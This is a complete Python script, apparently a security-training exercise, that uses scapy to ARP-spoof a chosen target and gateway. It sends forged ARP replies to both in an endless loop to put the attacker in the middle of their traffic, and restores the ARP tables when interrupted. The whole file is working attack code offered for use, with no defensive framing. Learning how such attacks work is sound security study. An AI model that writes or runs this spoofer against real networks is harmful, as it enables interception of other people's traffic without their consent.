#!/usr/bin/env python

import scapy.all as scapy
import optparse
import time

def get_mac(ip):
    #Arp request for specified ip address
    arp_request = scapy.ARP(pdst=ip)
    #broadcast to all other devices
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/ arp_request
    answered_arp_requests = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    return answered_arp_requests[0][1].hwsrc

def arp_spoofer(target_ip, spoof_ip):
    spoof_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=spoof_mac)
    scapy.send(packet, verbose = False)

def reset(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose = False)

def get_user_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target_ip_address", dest="target_ip_address", help="Enter target IP address")
    parser.add_option("-s", "--spoof_ip_address", dest="spoof_ip_address", help="Enter spoof IP address")
    (options, arguments) = parser.parse_args()

    if options.target_ip_address and options.spoof_ip_address:
        return options
    else:
        print("Please enter valid target and gateway ip address")

user_input = get_user_args()
gateway_ip = user_input.spoof_ip_address
target_ip = user_input.target_ip_address
packet_count = 2

try:
    while True:
        arp_spoofer(target_ip, gateway_ip)
        arp_spoofer(gateway_ip, target_ip)
        print("\r[+] Sent arp spoof packet " + str(packet_count), end="", flush=True)
        packet_count += 2
        time.sleep(2)

except KeyboardInterrupt:
    print("Keyboard interrupt detected. Resetting arp tables.")
    reset(target_ip, gateway_ip)
    reset(gateway_ip, target_ip)
    print("Arp tables resetted")